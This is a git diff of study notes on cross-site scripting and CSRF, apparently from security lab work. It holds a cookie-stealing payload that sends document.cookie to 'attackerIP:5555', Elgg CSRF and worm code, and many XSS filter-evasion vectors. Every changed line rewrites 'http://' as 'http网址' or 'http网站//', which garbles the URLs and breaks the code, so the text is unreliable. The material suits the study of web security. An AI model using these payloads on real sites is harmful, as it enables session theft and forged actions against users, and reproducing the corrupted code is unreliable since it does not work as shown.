@@ -29,7 +29,7 @@ toc: true
 
 // long code
 <script type="text/javascript"
-        src="http://www.example.com/myscripts.js">
+        src="http网站//www.example.com/myscripts.js">
 </script>
 // store the JavaScript program in a standalone file
 // save it with the .js extension
@@ -50,7 +50,7 @@ URL in the `src` field
 // send out the cookies
 // http GET
 <script>
-document.write('<img src=http://attackerIP:5555?c='
+document.write('<img src=http网址attackerIP:5555?c='
                      + escape(decument.cookie) + ' >');
 </script>
 ```
@@ -70,7 +70,7 @@ public class HTTPSimpleForge {
         String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";
 
         // URL to be forged.
-        URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
+        URL url = new URL ("http网址www.xsslabelgg.com/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
 
         // URLConnection instance is created
         // to further parameterize a resource request past what the state members of URL instance can represent.
@@ -156,7 +156,7 @@ window.onload = function () {
     var ts = "&__elgg_ts" + elgg.security.token.__elgg_ts;
 
     // A: Find user ID from LiveHTTPHeader
-    var sendurl = "http://www.web.com/action/add?friend=42"+token+ts;
+    var sendurl = "http网址www.web.com/action/add?friend=42"+token+ts;
 
 
     // write the Ajax code
@@ -238,7 +238,7 @@ Src/Link Approach:
 - If the worm is included using the `src` attribute in the `<script>` tag
 - can simply copy the `<script>` tag to the victim’s profile, essentially infecting the profile with the same worm.
 ```js
-<script type="text/javascript" src="http://example.com/xss_worm.js">
+<script type="text/javascript" src="http网站//example.com/xss_worm.js">
 </script>
 ```
 
@@ -303,7 +303,7 @@ eval('xmlhttp.onread' + 'yStateChange = callback');
 - normal XSS JavaScript injection
 
 ```js
-<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT SRC=http网址xss.rocks/xss.js></SCRIPT>
 ```
 
 ## XSS Locator (Polygot)
@@ -489,7 +489,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 ```js
 \<SCRIPT\\s != \<SCRIPT/XSS\\s:
 
-<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http网址xss.rocks/xss.js"></SCRIPT>
 ```
 
 Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc…) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
@@ -501,7 +501,7 @@ Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The
 Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.
 
 ```js
-<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/SRC="http网址xss.rocks/xss.js"></SCRIPT>
 ```
 
 ## Extraneous Open Brackets
@@ -515,7 +515,7 @@ Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection eng
 In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don’t actually need the \></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it’s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they’re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:
 
 ```
-<SjsCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SjsCRIPT SRC=http网址xss.rocks/xss.js?< B >
 ```
 
 ## Protocol Resolution in Script Tags
@@ -541,7 +541,7 @@ This particular variant was submitted by Łukasz Pilorz and was based partially 
 - Without it, Firefox will work but Netscape won’t:
 
 ```js
-<iframe src=http://xss.rocks/scriptlet.html <
+<iframe src=http网址xss.rocks/scriptlet.html <
 ```
 
 ## Escaping JavaScript Escapes
@@ -761,28 +761,28 @@ BGSOUND
 Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won’t work unless there is some content on the page other than the vector itself, so you’ll need to add a single letter to the page to make it work if it’s an otherwise blank page:
 
 ```js
-<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<LINK REL="stylesheet" HREF="http网址xss.rocks/xss.css">
 ```
 
 ## Remote style sheet part 2
 This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
 
 ```js
-<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<STYLE>@import'http网址xss.rocks/xss.css';</STYLE>
 ```
 
 ## Remote style sheet part 3
-This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://xss.rocks/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting ## vector is running the JavaScript, which is not supported in FireFox:
+This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http网址xss.rocks/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting ## vector is running the JavaScript, which is not supported in FireFox:
 
 ```js
-<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<http网址xss.rocks/xss.css>; REL=stylesheet">
 ```
 
 ## Remote style sheet part 4
 This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast ## majority of sites:
 
 ```js
-<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+<STYLE>BODY{-moz-binding:url("http网址xss.rocks/xssmoz.xml#xss")}</STYLE>
 ```
 
 ## STYLE Tags with Broken-up JavaScript for XSS
@@ -848,10 +848,10 @@ Directive URL scheme. This is nice because it also doesn’t have anything visib
 ```
 
 META with Additional URL Parameter
-If the target website attempts to see if the URL contains <http://>; at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):
+If the target website attempts to see if the URL contains <http网址>; at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):
 
 ```js
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http网址;URL=javascript:alert('XSS');">
 ```
 
 IFRAME
@@ -936,14 +936,14 @@ OBJECT Tag
 If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:
 
 ```js
-<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="http网址xss.rocks/scriptlet.html"></OBJECT>
 ```
 
 EMBED a Flash Movie That Contains XSS
-Click here for a demo: http://ha.ckers.org/xss.swf
+Click here for a demo: http网址ha.ckers.org/xss.swf
 
 ```js
-<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<EMBED SRC="http网址ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
 ```
 
 If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).
@@ -996,13 +996,13 @@ You can rename your JavaScript file to an image as an XSS vector:
 ```
 
 ```js
-<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<SCRIPT SRC="http网址xss.rocks/xss.jpg"></SCRIPT>
 ```
 
 ## SSI (Server Side Includes)
 This requires SSI to be installed on the server to use this XSS vector. I probably don’t need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
 
-<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http网址xss.rocks/xss.js></SCRIPT>'"-->
 
 PHP
 Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts ## remotely like this, there are probably much more dire issues:
@@ -1016,13 +1016,13 @@ IMG Embedded Commands
 This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc…. This is one of the lesser used but more useful XSS vectors:
 
 ```js
-<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<IMG SRC="http网址www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
 ```
 
 IMG Embedded Commands part II
 This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC="httx://badguy.com/a.jpg"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):
 ```
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Redirect 302 /a.jpg http网址victimsite.com/admin.asp&deleteuser
 ```
 Cookie Manipulation
 Admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim’s cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc…):
@@ -1082,39 +1082,39 @@ This XSS still worries me, as it would be nearly impossible to stop this without
 ```
 
 URL String Evasion
-Assuming http://www.google.com/ is programmatically disallowed:
+Assuming http网址www.google.com/ is programmatically disallowed:
 
 IP Versus Hostname
 
 ```js
-<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http网址66.102.7.147/">XSS</A>
 ```
 
 URL Encoding
 
 ```js
-<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http网址%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 ```
 
 DWORD Encoding
 Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:
 
 ```js
-<A HREF="http://1113982867/">XSS</A>
+<A HREF="http网址1113982867/">XSS</A>
 ```
 
 Hex Encoding
 The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):
 
 ```js
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http网址0x42.0x0000066.0x7.0x93/">XSS</A>
 ```
 
 Octal Encoding
 Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc…:
 
 ```js
-<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="http网址0102.0146.0007.00000223/">XSS</A>
 ```
 
 Base64 Encoding
@@ -1131,7 +1131,7 @@ Let’s mix and match base encoding and throw in some tabs and newlines - why br
 tt  p://6	6.000146.0x7.147/">XSS</A>
 
 Protocol Resolution Bypass
-// translates to http:// which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.
+// translates to http网址 which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.
 
 <A HREF="//www.google.com/">XSS</A>
 ```
@@ -1146,40 +1146,40 @@ Google “feeling lucky” part 2.
 This uses a very tiny trick that appears to work Firefox only, because of it’s implementation of the “feeling lucky” function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It’s simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:
 
 ```js
-<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="http网址ha.ckers.org@google">XSS</A>
 ```
 
 Google “feeling lucky” part 3.
 This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the “feeling lucky” function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case “google”):
 
 ```js
-<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http网址google:ha.ckers.org">XSS</A>
 ```
 
 Removing CNAMEs
 When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):
 
 ```js
-<A HREF="http://google.com/">XSS</A>
+<A HREF="http网址google.com/">XSS</A>
 ```
 
 Extra dot for absolute DNS:
 
 ```js
-<A HREF="http://www.google.com./">XSS</A>
+<A HREF="http网址www.google.com./">XSS</A>
 ```
 
 JavaScript Link Location:
 
 ```js
-<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<A HREF="javascript:document.location='http网址www.google.com/'">XSS</A>
 ```
 
 Content Replace as Attack Vector
-Assuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\#x09;script: was converted into java	script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):
+Assuming http网址www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\#x09;script: was converted into java	script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):
 
 ```js
-<A HREF="http://www.google.com/ogle.com/">XSS</A>
+<A HREF="http网址www.google.com/ogle.com/">XSS</A>
 ```
 
 Assisting XSS with HTTP Parameter Pollution
